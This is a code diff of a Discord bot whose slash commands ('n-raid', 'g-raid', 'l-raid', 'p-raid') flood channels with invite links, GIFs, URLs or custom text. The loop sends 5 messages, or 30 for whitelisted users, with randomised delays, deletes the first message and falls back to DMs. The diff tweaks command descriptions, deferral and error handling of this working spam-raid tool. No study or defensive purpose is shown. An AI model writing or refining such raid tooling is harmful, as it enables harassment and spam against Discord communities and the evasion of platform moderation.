@@ -36,12 +36,12 @@ const client = new Client({
 });
 
 const commands = [
-  new SlashCommandBuilder().setName('n-raid').setDescription('Flood reply custom/invite').addStringOption(o => o.setName('msg').setDescription('Optional custom').setRequired(false)),
-  new SlashCommandBuilder().setName('g-raid').setDescription('Flood gif reply').addStringOption(o => o.setName('gif').setDescription('Gif url').setRequired(true)),
-  new SlashCommandBuilder().setName('l-raid').setDescription('Flood link reply').addStringOption(o => o.setName('link').setDescription('Url').setRequired(true)),
-  new SlashCommandBuilder().setName('p-raid').setDescription('Flood invite reply'),
+  new SlashCommandBuilder().setName('n-raid').setDescription('Flood reply').addStringOption(o => o.setName('msg').setDescription('Optional custom').setRequired(false)),
+  new SlashCommandBuilder().setName('g-raid').setDescription('Flood gif').addStringOption(o => o.setName('gif').setDescription('Gif url').setRequired(true)),
+  new SlashCommandBuilder().setName('l-raid').setDescription('Flood link').addStringOption(o => o.setName('link').setDescription('Url').setRequired(true)),
+  new SlashCommandBuilder().setName('p-raid').setDescription('Flood invite'),
   new SlashCommandBuilder().setName('invote').setDescription('Set invite').addStringOption(o => o.setName('link').setDescription('discord.gg/...').setRequired(true)),
-  new SlashCommandBuilder().setName('whitelist').setDescription('Whitelist (owner)').addUserOption(o => o.setName('user').setDescription('@user').setRequired(true)),
+  new SlashCommandBuilder().setName('whitelist').setDescription('Whitelist').addUserOption(o => o.setName('user').setDescription('@user').setRequired(true)),
   new SlashCommandBuilder().setName('oauth2').setDescription('Bot invite'),
   new SlashCommandBuilder().setName('bot').setDescription('Public add')
 ].map(c => c.toJSON());
@@ -67,7 +67,8 @@ client.on('interactionCreate', async i => {
 
   const cmd = i.commandName;
 
-  await i.deferReply({ ephemeral: true }).catch(e => console.log('Defer failed:', e.message));
+  // Defer IMMEDIATELY
+  await i.deferReply({ ephemeral: true }).catch(e => console.log('Defer fail:', e));
 
   let channel = i.channel;
   if (!channel && i.channelId && i.guild) {
@@ -75,7 +76,6 @@ client.on('interactionCreate', async i => {
   }
 
   let content = currentInvite;
-
   if (cmd === 'n-raid') {
     const m = i.options.getString('msg');
     if (m) content = m;
@@ -88,12 +88,11 @@ client.on('interactionCreate', async i => {
   const isWl = whitelisted.has(i.user.id);
   const count = isWl ? 30 : 5;
 
-  console.log(`${i.user.tag} ${cmd} (${count}x) wl:${isWl} channel:${channel?.name || 'null'}`);
+  console.log(`${i.user.tag} ${cmd} ${count}x channel: ${channel?.name || 'NULL'}`);
 
   if (!channel) {
-    console.log('Channel null - DM or bot not in guild');
-    await i.followup({ content: 'Run in a server where bot is added (not DMs)', ephemeral: true }).catch(() => {});
-    try { await i.user.send(currentInvite + ' (DM fallback)'); } catch {}
+    await i.followup({ content: 'No channel - run in server bot is in (not DMs)', ephemeral: true }).catch(() => {});
+    try { await i.user.send(content); } catch {}
     await i.deleteReply().catch(() => {});
     return;
   }
@@ -111,12 +110,13 @@ client.on('interactionCreate', async i => {
 
       if (k === 0) {
         first = sent;
-        setTimeout(() => sent.delete().catch(e => console.log('Del fail:', e.message)), 2000);
+        setTimeout(() => sent.delete().catch(() => {}), 2000);
       }
 
       await new Promise(r => setTimeout(r, 1000 + Math.random() * 800));
     } catch (e) {
       console.log(`Loop ${k+1} fail: ${e.message}`);
+      await i.followup({ content: `Stopped: ${e.message}`, ephemeral: true }).catch(() => {});
       break;
     }
   }
